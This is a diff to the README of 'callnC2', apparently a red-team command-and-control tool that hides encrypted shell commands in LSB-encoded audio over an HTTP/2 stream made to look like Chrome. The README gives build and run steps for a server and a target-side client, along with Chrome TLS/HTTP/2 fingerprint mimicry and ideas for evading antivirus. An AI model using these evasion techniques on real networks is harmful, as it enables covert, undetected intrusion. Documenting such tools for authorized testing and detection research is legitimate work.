@@ -1,7 +1,7 @@
 # callnC2
 A covert command-and-control framework that tunnels encrypted shell commands through LSB-encoded audio bytes, over a persistent HTTP/2 stream, mimicking TCP/443 fallback behaviour of VoIP applications in enterprise envs, where UDP is restricted.
 
-> **Educationl/Research Use only**. This tool is intended for authorized red team engagements, CTF competitions, and security researches in controlled environments. Do not use it against systems you do not have explicit wirtten permissions to test.
+> **Educational/Research Use only**. This tool is intended for authorized red team engagements, CTF competitions, and security researches in controlled environments. Do not use it against systems you do not have explicit wirtten permissions to test. Tested only in isolated lab VMs against my own infrastructure.
 
 ## Setup
 <img width="890" height="292" alt="audchat3" src="https://github.com/user-attachments/assets/dce97a71-bae8-41fe-8e2e-1a084216ab51" />
@@ -16,9 +16,9 @@ openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -sha256 -d
 GOOS=linux GOARCH=amd64 go build -o server server.go data_transform_helper.go
 GOOS=linux GOARCH=amd64 go build -o client client.go data_transform_helper.go
 
-./server -debug off [-ebit 4 ]
+./server -debug off [-ebit 0 ]
 #transfer the client and sample.wav to target, or use the upcoming mic branch
-./client -target <IP> [-ebit 4] [-peet true]
+./client -target <IP> [-ebit 0] [-peet true]
 #make sure you use matching values of -ebit, 0-7, default 0
 ```
 ---
@@ -27,7 +27,7 @@ callnC2 hides C2 traffic inside what looks like a Chrome browzer on a VoIP audio
 
 The payload is the operator commands outbound, and shell output inbout to c2. These are encoded bit-by-bit into LSB of audio bytes flowing in both directions over a single persistent HTTP/2 stream. No separate C2 channels exists on the wire. The only observable traffic is what appears to be a VoIP client, maintaining an audio call over HTTPS.
 - TLS fingerprint identical to Chrome (uTLS `HelloChrome_Auto`)
-- HTTP/2 SETTINGS, WINDOW_UPDATE, PRIORITY, and header order match chrome exactly via [http2chrmoe](https://ajithor.github.com/http2chrome).
+- HTTP/2 SETTINGS, WINDOW_UPDATE, PRIORITY, and header order match chrome exactly via [http2chrome](https://ajithor.github.com/http2chrome).
 - Single persistent bidirectional HTTP/2 stream, which means no polling, no discrete requests after initial connection.
 - AES-GCM encrypted payload before bit encoding
 - configurable bit plane, to increase survical chances on agressive network modification, at the cost of audio distortion.
@@ -56,12 +56,12 @@ The bit used for encoding is configurable at runtime, with the `-ebit` option. D
 command string --> AES-GCM encrypt --> "STRT"+command+"STOP" --> convert each char into 8 bits. -->For each bit b, for each audio byte s: s= (s & andVal)| (b | orVal) (overwrite any Bit) -->Modified audio bytes streamed over HTTP/2
 
 ### Output/command Decoding
-Incoming audio bytes --> check for first 4 bytes of each chunk for "STRT". If it doesnt exist, move on to next chunk. If it exists -> extract target Bit of each byte -> append to bit buffer --> every 8 bits assembled to byte -> cast to char till you see "STOP"--> AES-GMC decrypt.
+Incoming audio bytes --> check for first 4 bytes of each chunk for "STRT". If it doesnt exist, move on to next chunk. If it exists -> extract target Bit of each byte -> append to bit buffer --> every 8 bits assembled to byte -> cast to char till you see "STOP"--> AES-GCM decrypt.
 
 ### Encryption specifics
 - key - 16, 24 or 32 bytes (AES-128/192/256) (code has hardcoded 16-byte key)
 - nonce - 12 random bytes per message (crypto/rand)
-- overhead - 28 butes (12 nonce + 16 tag)
+- overhead - 28 bytes (12 nonce + 16 tag)
 - padding - none required, since this is CTR mode, so ciphertext length = plaintext length
 - Nonce is prepended to ciphertext and travels with it - `Seal(nonce, nonce, plaintext, nil)` (`(nonce || ciphertext || tag)`)
 - Decryption splits the first 12 bytes as nonce, remainder as ciphertext.
@@ -70,8 +70,8 @@ Incoming audio bytes --> check for first 4 bytes of each chunk for "STRT". If it
 ---
 ## Traffic Evasion
 ### TLS fingerprint
-uTLS `HelloChrome_Auto` produces a byte-accurate Chrome ClientHello. The cipher suits, extensions, elliptic curves and GREASE valies are hence all identical to real chrome browzer.
-### HTTP/2 fingreprint
+uTLS `HelloChrome_Auto` produces a byte-accurate Chrome ClientHello. The cipher suites, extensions, elliptic curves and GREASE valies are hence all identical to real chrome browzer.
+### HTTP/2 fingerprint
 [http2chrome](https://github.com/ajithor/http2chrome) is a fork of `golang.org/x/net`, which matches Chrome's exact HTTP/2 wire behaviour, and a verified akamai finderprint `1:65536;2:0;4:6291456;6:262144|15663105|0|m,a,s,p`
 
 | Component              | Go default   | Chrome (callnC2)        |
@@ -89,7 +89,7 @@ uTLS `HelloChrome_Auto` produces a byte-accurate Chrome ClientHello. The cipher 
 ### HTTP headers
 Request and response headers are handcrafted on both sides to mimic Chrome's exact field names, values and ordering.
 ### The overall cover
-Single persistent `POST /stream` over port 443 with continuous bidirectional audio-sized data flow matches the TCP/443 fallback of enterprise VoIP clients (like Teams, Zoom, or Webex), when UPD is unavailable. The traffic pattern is indinguishable from a legitimate audio call at the network layer.
+Single persistent `POST /stream` over port 443 with continuous bidirectional audio-sized data flow matches the TCP/443 fallback of enterprise VoIP clients (like Teams, Zoom, or Webex), when UDP is unavailable. The traffic pattern is indistinguishable from a legitimate audio call at the network layer.
 
 ---
 ## Beaconing
@@ -145,13 +145,13 @@ rule-matching layer.
 ---
 ## Limitations
 ### Symmetric key
-AES-GCM key is currently hardcoded at compile time. Binary capture exposes the key. Something like X25519 + HKDF key exchange would eliminate this without modification to the LSB engin.
+AES-GCM key is currently hardcoded at compile time. Binary capture exposes the key. Something like X25519 + HKDF key exchange would eliminate this without modification to the LSB engine.
 
 ### Host layer evasion
 callnC2 addresses network-layer detection only. The Go binary itself is detectable by host-based AV. None of these are in the scope of this project.
 - static string analysis (could use garble to compile the code for this)
 - runtime signatures (custom Go runtime would address this)
-- import table analysis (direct syscalls would adress this)
+- import table analysis (direct syscalls would address this)
 - Behavioural detection (something that is dealt by process injection)
 - Memory scanning (in-memory execution could evade this to a certain point)
 
